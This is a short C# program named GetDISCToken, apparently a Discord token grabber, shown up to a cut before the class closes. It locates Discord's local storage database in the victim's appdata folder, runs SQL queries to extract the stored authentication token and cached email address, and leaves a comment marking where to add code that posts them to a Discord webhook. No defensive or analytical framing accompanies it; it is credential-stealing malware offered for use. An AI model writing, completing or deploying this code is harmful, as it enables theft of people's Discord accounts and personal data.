using System;
using System.Collections.Specialized;
using System.Data.SQLite;
using System.IO;
using System.Net;
using System.Text;
using Webhook;

namespace GetDISCToken
{
	internal class Program
	{
		private static void Main(string[] args)
		{
			string environmentVariable = Environment.GetEnvironmentVariable("appdata");
			if (File.Exists(environmentVariable + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage"))
			{
				string arg = environmentVariable + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage";
				SQLiteConnection sqliteConnection = new SQLiteConnection(string.Format("Data Source='{0}'", arg));
				sqliteConnection.Open();
				SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
				sqliteCommand.CommandText = "SELECT value FROM ItemTable WHERE key = 'token'";
				SQLiteCommand sqliteCommand2 = sqliteConnection.CreateCommand();
				sqliteCommand2.CommandText = "SELECT value FROM ItemTable WHERE key = 'email_cache'";
				SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();
				SQLiteDataReader sqliteDataReader2 = sqliteCommand2.ExecuteReader();
				sqliteDataReader.Read();
				sqliteDataReader2.Read();
				string @string = Encoding.UTF8.GetString((byte[])sqliteDataReader["value"]);
				string string2 = Encoding.UTF8.GetString((byte[])sqliteDataReader2["value"]);
				//put right here where you want to post the token (POST, Discord Webhook)
			}
		}